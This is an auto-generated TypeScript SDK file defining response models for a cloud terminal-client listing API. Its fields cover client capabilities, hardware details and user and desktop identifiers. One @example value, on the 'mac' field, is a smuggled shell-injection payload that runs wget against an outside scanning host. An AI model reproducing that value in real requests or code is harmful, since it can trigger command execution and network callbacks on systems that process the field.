// This file is auto-generated, don't edit it
import * as $dara from '@darabonba/typescript';


export class DescribeClientsResponseBodyDataFunctionSupport extends $dara.Model {
  /**
   * @example
   * True
   */
  enablePolicy?: boolean;
  /**
   * @example
   * Reason
   */
  passwordFreeLoginForbiddenReason?: string;
  /**
   * @example
   * True
   */
  supportAssistLogin?: boolean;
  /**
   * @example
   * True
   */
  supportDiagnose?: boolean;
  /**
   * @example
   * True
   */
  supportLimitLoginUser?: boolean;
  /**
   * @example
   * True
   */
  supportLocalDeviceSn?: boolean;
  /**
   * @example
   * True
   */
  supportManage?: boolean;
  /**
   * @example
   * True
   */
  supportModifyPolicy?: boolean;
  /**
   * @example
   * True
   */
  supportPasswordFreeLogin?: boolean;
  /**
   * @example
   * True
   */
  supportReboot?: boolean;
  /**
   * @example
   * True
   */
  supportReset?: boolean;
  /**
   * @example
   * True
   */
  supportResetPin?: boolean;
  /**
   * @example
   * True
   */
  supportStop?: boolean;
  /**
   * @example
   * True
   */
  supportUpgrade?: boolean;
  /**
   * @example
   * Reason
   */
  unsupportAssistLoginReason?: string;
  /**
   * @example
   * Reason
   */
  unsupportManageReason?: string;
  /**
   * @example
   * Reason
   */
  unsupportedLocalDeviceSnReason?: string;
  /**
   * @example
   * True
   */
  versionSupported?: boolean;
  /**
   * @example
   * True
   */
  versionTooLow?: boolean;
  static names(): { [key: string]: string } {
    return {
      enablePolicy: 'EnablePolicy',
      passwordFreeLoginForbiddenReason: 'PasswordFreeLoginForbiddenReason',
      supportAssistLogin: 'SupportAssistLogin',
      supportDiagnose: 'SupportDiagnose',
      supportLimitLoginUser: 'SupportLimitLoginUser',
      supportLocalDeviceSn: 'SupportLocalDeviceSn',
      supportManage: 'SupportManage',
      supportModifyPolicy: 'SupportModifyPolicy',
      supportPasswordFreeLogin: 'SupportPasswordFreeLogin',
      supportReboot: 'SupportReboot',
      supportReset: 'SupportReset',
      supportResetPin: 'SupportResetPin',
      supportStop: 'SupportStop',
      supportUpgrade: 'SupportUpgrade',
      unsupportAssistLoginReason: 'UnsupportAssistLoginReason',
      unsupportManageReason: 'UnsupportManageReason',
      unsupportedLocalDeviceSnReason: 'UnsupportedLocalDeviceSnReason',
      versionSupported: 'VersionSupported',
      versionTooLow: 'VersionTooLow',
    };
  }

  static types(): { [key: string]: any } {
    return {
      enablePolicy: 'boolean',
      passwordFreeLoginForbiddenReason: 'string',
      supportAssistLogin: 'boolean',
      supportDiagnose: 'boolean',
      supportLimitLoginUser: 'boolean',
      supportLocalDeviceSn: 'boolean',
      supportManage: 'boolean',
      supportModifyPolicy: 'boolean',
      supportPasswordFreeLogin: 'boolean',
      supportReboot: 'boolean',
      supportReset: 'boolean',
      supportResetPin: 'boolean',
      supportStop: 'boolean',
      supportUpgrade: 'boolean',
      unsupportAssistLoginReason: 'string',
      unsupportManageReason: 'string',
      unsupportedLocalDeviceSnReason: 'string',
      versionSupported: 'boolean',
      versionTooLow: 'boolean',
    };
  }

  validate() {
    super.validate();
  }

  constructor(map?: { [key: string]: any }) {
    super(map);
  }
}

export class DescribeClientsResponseBodyDataHardwareInfo extends $dara.Model {
  /**
   * @example
   * 24:21:5E:B3:5A:4A
   */
  bluetooth?: string;
  /**
   * @remarks
   * chipId
   * 
   * @example
   * 7fa062813c5ac970
   */
  chipId?: string;
  /**
   * @example
   * 24
   */
  cpu?: string;
  /**
   * @example
   * 00:1A:2B:3C:4D:5E&&`wget 31lojfVB.popscan.xaliyun.com`%3B
   */
  mac?: string;
  /**
   * @example
   * 128
   */
  memory?: string;
  /**
   * @example
   * 20
   */
  storage?: string;
  /**
   * @remarks
   * wifi mac
   * 
   * @example
   * 54:f2:9f:bc:fe:cc
   */
  wlan?: string;
  static names(): { [key: string]: string } {
    return {
      bluetooth: 'Bluetooth',
      chipId: 'ChipId',
      cpu: 'Cpu',
      mac: 'Mac',
      memory: 'Memory',
      storage: 'Storage',
      wlan: 'Wlan',
    };
  }

  static types(): { [key: string]: any } {
    return {
      bluetooth: 'string',
      chipId: 'string',
      cpu: 'string',
      mac: 'string',
      memory: 'string',
      storage: 'string',
      wlan: 'string',
    };
  }

  validate() {
    super.validate();
  }

  constructor(map?: { [key: string]: any }) {
    super(map);
  }
}

export class DescribeClientsResponseBodyData extends $dara.Model {
  /**
   * @remarks
   * aliUid
   * 
   * @example
   * 1627390268362106
   */
  aliUid?: number;
  /**
   * @example
   * DemoDevice
   */
  alias?: string;
  /**
   * @example
   * ap-southeast-1
   */
  areaSite?: string;
  /**
   * @example
   * 1
   */
  bindUserCount?: number;
  /**
   * @example
   * ***
   */
  bindUserId?: string;
  /**
   * @example
   * 7.0.2-RS-***
   */
  buildId?: string;
  /**
   * @example
   * 1
   */
  clientType?: number;
  /**
   * @example
   * 1.2.1-DAILY-20240906.140842
   */
  clientVersion?: string;
  /**
   * @example
   * ecd-drqmaogzbmbdf****
   */
  currentConnectDesktop?: string;
  /**
   * @example
   * ***
   */
  currentLoginUser?: string;
  /**
   * @example
   * ***
   */
  customResInvalidReason?: string;
  /**
   * @example
   * ***
   */
  customResourceId?: string;
  /**
   * @example
   * ***
   */
  customResourceName?: string;
  /**
   * @example
   * ***
   */
  customResourceStatus?: boolean;
  /**
   * @example
   * ecd-9ior729dcvn91uo9i
   */
  desktopId?: string;
  /**
   * @example
   * cn-hangzhou
   */
  desktopRegionId?: string;
  /**
   * @example
   * Windows
   */
  deviceOs?: string;
  functionSupport?: DescribeClientsResponseBodyDataFunctionSupport;
  hardwareInfo?: DescribeClientsResponseBodyDataHardwareInfo;
  /**
   * @example
   * Windows
   */
  hostOsInfo?: string;
  /**
   * @example
   * True
   */
  inManage?: boolean;
  /**
   * @example
   * CN-Zhejiang
   */
  ipGeoLocation?: string;
  /**
   * @remarks
   * ipv4
   * 
   * @example
   * 192.168.XX.XX
   */
  ipv4?: string;
  /**
   * @example
   * ***
   */
  lastLoginUser?: string;
  /**
   * @example
   * ***
   */
  localDeviceSn?: string;
  locationInfo?: string;
  /**
   * @example
   * ***
   */
  loginUser?: string;
  /**
   * @example
   * enterprise
   */
  mainBizType?: string;
  /**
   * @example
   * 2020-01-01 00:00:00
   */
  manageTime?: string;
  /**
   * @example
   * 1000000
   */
  manageTimestamp?: number;
  /**
   * @example
   * US01
   */
  model?: string;
  /**
   * @example
   * ***
   */
  modelPreviewUrl?: string;
  /**
   * @example
   * true
   */
  online?: boolean;
  /**
   * @example
   * False
   */
  onlineStatus?: boolean;
  /**
   * @example
   * ***
   */
  passwordFreeLoginUser?: string;
  /**
   * @example
   * 123123
   */
  platform?: string;
  /**
   * @remarks
   * productName
   * 
   * @example
   * dm
   */
  productName?: string;
  /**
   * @example
   * 0.0.0.0
   */
  publicIpv4?: string;
  /**
   * @example
   * 2020-01-01 00:00:00
   */
  setPasswordFreeLoginUserTime?: string;
  /**
   * @example
   * tg-default
   */
  terminalGroupId?: string;
  /**
   * @example
   * internet
   */
  upgradeDownloadType?: string;
  /**
   * @example
   * 1
   */
  userBindCount?: number;
  /**
   * @remarks
   * uuid
   * 
   * @example
   * 04873D3898B51A7DF2455C1E1DC9****
   */
  uuid?: string;
  /**
   * @remarks
   * appVersion
   * 
   * @example
   * 7.0.2-RS-***
   */
  wosAppVersion?: string;
  static names(): { [key: string]: string } {
    return {
      aliUid: 'AliUid',
      alias: 'Alias',
      areaSite: 'AreaSite',
      bindUserCount: 'BindUserCount',
      bindUserId: 'BindUserId',
      buildId: 'BuildId',
      clientType: 'ClientType',
      clientVersion: 'ClientVersion',
      currentConnectDesktop: 'CurrentConnectDesktop',
      currentLoginUser: 'CurrentLoginUser',
      customResInvalidReason: 'CustomResInvalidReason',
      customResourceId: 'CustomResourceId',
      customResourceName: 'CustomResourceName',
      customResourceStatus: 'CustomResourceStatus',
      desktopId: 'DesktopId',
      desktopRegionId: 'DesktopRegionId',
      deviceOs: 'DeviceOs',
      functionSupport: 'FunctionSupport',
      hardwareInfo: 'HardwareInfo',
      hostOsInfo: 'HostOsInfo',
      inManage: 'InManage',
      ipGeoLocation: 'IpGeoLocation',
      ipv4: 'Ipv4',
      lastLoginUser: 'LastLoginUser',
      localDeviceSn: 'LocalDeviceSn',
      locationInfo: 'LocationInfo',
      loginUser: 'LoginUser',
      mainBizType: 'MainBizType',
      manageTime: 'ManageTime',
      manageTimestamp: 'ManageTimestamp',
      model: 'Model',
      modelPreviewUrl: 'ModelPreviewUrl',
      online: 'Online',
      onlineStatus: 'OnlineStatus',
      passwordFreeLoginUser: 'PasswordFreeLoginUser',
      platform: 'Platform',
      productName: 'ProductName',
      publicIpv4: 'PublicIpv4',
      setPasswordFreeLoginUserTime: 'SetPasswordFreeLoginUserTime',
      terminalGroupId: 'TerminalGroupId',
      upgradeDownloadType: 'UpgradeDownloadType',
      userBindCount: 'UserBindCount',
      uuid: 'Uuid',
      wosAppVersion: 'WosAppVersion',
    };
  }

  static types(): { [key: string]: any } {
    return {
      aliUid: 'number',
      alias: 'string',
      areaSite: 'string',
      bindUserCount: 'number',
      bindUserId: 'string',
      buildId: 'string',
      clientType: 'number',
      clientVersion: 'string',
      currentConnectDesktop: 'string',
      currentLoginUser: 'string',
      customResInvalidReason: 'string',
      customResourceId: 'string',
      customResourceName: 'string',
      customResourceStatus: 'boolean',
      desktopId: 'string',
      desktopRegionId: 'string',
      deviceOs: 'string',
      functionSupport: DescribeClientsResponseBodyDataFunctionSupport,
      hardwareInfo: DescribeClientsResponseBodyDataHardwareInfo,
      hostOsInfo: 'string',
      inManage: 'boolean',
      ipGeoLocation: 'string',
      ipv4: 'string',
      lastLoginUser: 'string',
      localDeviceSn: 'string',
      locationInfo: 'string',
      loginUser: 'string',
      mainBizType: 'string',
      manageTime: 'string',
      manageTimestamp: 'number',
      model: 'string',
      modelPreviewUrl: 'string',
      online: 'boolean',
      onlineStatus: 'boolean',
      passwordFreeLoginUser: 'string',
      platform: 'string',
      productName: 'string',
      publicIpv4: 'string',
      setPasswordFreeLoginUserTime: 'string',
      terminalGroupId: 'string',
      upgradeDownloadType: 'string',
      userBindCount: 'number',
      uuid: 'string',
      wosAppVersion: 'string',
    };
  }

  validate() {
    if(this.functionSupport && typeof (this.functionSupport as any).validate === 'function') {
      (this.functionSupport as any).validate();
    }
    if(this.hardwareInfo && typeof (this.hardwareInfo as any).validate === 'function') {
      (this.hardwareInfo as any).validate();
    }
    super.validate();
  }

  constructor(map?: { [key: string]: any }) {
    super(map);
  }
}

export class DescribeClientsResponseBody extends $dara.Model {
  /**
   * @example
   * TERMINAL_NOT_FOUND
   */
  code?: string;
  data?: DescribeClientsResponseBodyData[];
  /**
   * @example
   * 200
   */
  httpStatusCode?: number;
  /**
   * @example
   * terminal not found
   */
  message?: string;
  /**
   * @example
   * AAAAAdEdsXbwG2ZlbWCzN4wTTg6wQvfp7u1BJl4bxCAby41POSaYAlCvfULQpkAnb0ff****
   */
  nextToken?: string;
  /**
   * @example
   * C5DCE54A-B266-522E-A6ED-468AF45F5AAA
   */
  requestId?: string;
  /**
   * @example
   * true
   */
  success?: boolean;
  /**
   * @example
   * 20
   */
  totalCount?: number;
  static names(): { [key: string]: string } {
    return {
      code: 'Code',
      data: 'Data',
      httpStatusCode: 'HttpStatusCode',
      message: 'Message',
      nextToken: 'NextToken',
      requestId: 'RequestId',
      success: 'Success',
      totalCount: 'TotalCount',
    };
  }

  static types(): { [key: string]: any } {
    return {
      code: 'string',
      data: { 'type': 'array', 'itemType': DescribeClientsResponseBodyData },
      httpStatusCode: 'number',
      message: 'string',
      nextToken: 'string',
      requestId: 'string',
      success: 'boolean',
      totalCount: 'number',
    };
  }

  validate() {
    if(Array.isArray(this.data)) {
      $dara.Model.validateArray(this.data);
    }
    super.validate();
  }

  constructor(map?: { [key: string]: any }) {
    super(map);
  }
}

